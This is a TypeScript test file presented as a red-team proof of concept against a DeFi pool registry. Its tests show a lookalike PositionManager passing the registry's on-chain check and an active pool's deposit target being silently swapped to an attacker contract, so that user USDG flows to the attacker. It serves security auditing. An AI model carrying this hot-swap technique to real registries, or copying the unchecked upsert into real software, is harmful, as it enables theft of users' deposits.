// RED-TEAM PoC (off-chain, 2026-09-08) — A-7 deepened: the registry trust root accepts a LOOKALIKE
// PositionManager and lets a curator-secret holder HOT-SWAP the deposit target of an ACTIVE pool.
// Each test PASSING = the weakness is demonstrated (these are not regression tests of a fix).
import { describe, it, expect, vi } from 'vitest'
import { computePoolId, verifyInstanceOnChain, registerInstance, type GatewayPoolKey } from '../registry'
import { fakeSupabase } from './fakeSupabase'

const USDG = '0x5fc5360d0400a0fd4f2af552add042d716f1d168' as const // real RH-mainnet USDG (public)
const MEME = '0x2222222222222222222222222222222222222222' as const
const REAL_PM = '0x000000000000000000000000000000000000rea1' as const
const EVIL_PM = '0x00000000000000000000000000000000000000ev' as const
const EVIL_STAGING = '0x000000000000000000000000000000000000dead' as const

const key: GatewayPoolKey = { currency0: MEME, currency1: USDG, fee: 3000, tickSpacing: 60, hooks: '0x0000000000000000000000000000000000000000' }
const POOL_ID = computePoolId(key)

/** A hostile contract that simply ECHOES the approved pool's quoteAsset()/poolKey() — trivial to write
 *  (two view functions) — while its deposit() forwards the user's approved USDG to the attacker. */
function lookalikePm(quote = USDG, pk = key) {
  return { readContract: vi.fn(async ({ functionName }: { functionName: string }) => (functionName === 'quoteAsset' ? quote : pk)) }
}

describe('A-7 (deepened): registry H-01 check is satisfiable by a lookalike PM', () => {
  it('verifyInstanceOnChain returns ok for a contract that merely echoes quoteAsset()/poolKey()', async () => {
    const v = await verifyInstanceOnChain({ client: lookalikePm(), positionManager: EVIL_PM, expectedQuoteAsset: USDG, expectedPoolAddress: POOL_ID })
    expect(v.ok).toBe(true) // ← nothing ties EVIL_PM to factory.instanceForPool(poolId) or to audited bytecode
  })

  it('does NOT check the quote asset against the platform USDG — a fake "USDG" is accepted if internally consistent', async () => {
    const FAKE = '0xfa4efa4efa4efa4efa4efa4efa4efa4efa4efa4e' as const
    const fakeKey = { ...key, currency1: FAKE }
    const v = await verifyInstanceOnChain({
      client: lookalikePm(FAKE, fakeKey), positionManager: EVIL_PM,
      expectedQuoteAsset: FAKE, // curator-supplied (curate route body `instance.quoteAsset`), not LP_GATEWAY_USDG
      expectedPoolAddress: computePoolId(fakeKey),
    })
    expect(v.ok).toBe(true)
  })

  it('does NOT reject a hooked pool key (contract constructor does; the off-chain root does not)', async () => {
    const hooked = { ...key, hooks: '0x00000000000000000000000000000000000000c0' as const }
    const v = await verifyInstanceOnChain({ client: lookalikePm(USDG, hooked), positionManager: EVIL_PM, expectedQuoteAsset: USDG, expectedPoolAddress: computePoolId(hooked) })
    expect(v.ok).toBe(true)
  })

  it('registerInstance UPSERTS on (pool_address, chain_id): an ACTIVE pool’s deposit target is silently replaced', async () => {
    const { db, client } = fakeSupabase({
      tables: { gateway_instances: [{ id: 'live', pool_address: POOL_ID, chain_id: 4663, position_manager: REAL_PM, staging: '0x0000000000000000000000000000000000005tag', quote_asset: USDG, status: 'active' }] },
    })
    const r = await registerInstance(
      client,
      { poolAddress: POOL_ID, chainId: 4663, positionManager: EVIL_PM, staging: EVIL_STAGING, quoteAsset: USDG },
      { client: lookalikePm() },
    )
    expect(r.ok).toBe(true)
    const row = db.tables.gateway_instances.find((x) => x.pool_address === POOL_ID)!
    expect(row.position_manager).toBe(EVIL_PM) // ← the row every /api/gateway/meta + deposit-verify reads
    expect(row.staging).toBe(EVIL_STAGING) // staging is written verbatim — never verified on-chain
    expect(row.status).toBe('active')
    expect(db.tables.gateway_instances.length).toBe(1) // no history, no "already active" refusal
  })
})
